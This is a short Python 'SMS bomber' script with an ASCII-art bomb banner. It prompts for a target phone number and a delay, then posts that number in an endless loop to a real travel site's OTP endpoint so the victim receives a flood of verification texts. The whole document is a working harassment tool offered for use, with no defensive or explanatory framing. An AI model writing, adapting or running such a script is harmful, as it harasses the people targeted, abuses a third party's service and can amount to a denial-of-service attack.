print(
'''
                        $¶   ¶  ¶¢
           ¶¶¶¶¶¶¶       ¶¢   ¶   ø¶
          ¶¶    ø¶¶¶      oø  ø  øo
          ¶7       ¶¶¶      1´´´1´´´´1o
        ¶¶¶¶¶¶¶      ¶¶¶7   ¢¢ 1o¶¶¶ø
       ¶¶¶¶¶¶¶¶¶         ¶¶¶¶¶¶¶¶  1
     ¶¶¶¶¶¶¶¶¶¶¶¶¶          ¢´´´´o$¢
   ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶         ¢´´1ø´´´1¶¶
  ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶         $´´´¶
 ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶       ¶´´´´o¶´
 ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶     ¶¶
  ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶´
   ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶´
     ¶¶¶¶¶¶¶¶¶¶¶¶´
       ¶¶¶¶¶¶¶¶


 
         A          LL              II               
        AAA         LL              II           
       AA AA        LL              II                 
      AA   AA       LL              II                      
     AAAAAAAAA      LL              II       ____   __       ____   __  ___      
    AA       AA     LL              II        |__| |  | |\/|  |__| |__  |__|  
   AA         AA    LLLLLLLLLLLLL   II       _|__| |__| |  | _|__| |__  |  \          
   
'''
    )
              
import requests
import time

target = int(input("Enter your number :"))
sec = int(input("Seconds :"))
url = "https://ws.alibaba.ir/api/v3/account/mobile/otp"
c=1

while True:
    time.sleep(sec)
    pyload = {"phoneNumber":target}
    a = requests.post(url, json=pyload)
    print("Sent",c)
    c=c+1
